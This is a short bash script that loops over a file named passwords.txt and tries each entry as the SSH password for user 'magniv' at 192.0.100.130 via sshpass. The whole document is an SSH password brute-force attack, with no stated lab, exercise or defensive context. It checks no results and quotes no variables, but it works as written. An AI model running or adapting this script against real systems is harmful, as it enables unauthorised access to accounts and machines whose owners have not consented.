#!/bin/bash

for pass in $(cat "./passwords.txt")
do
    sshpass -p $pass ssh magniv@192.0.100.130
done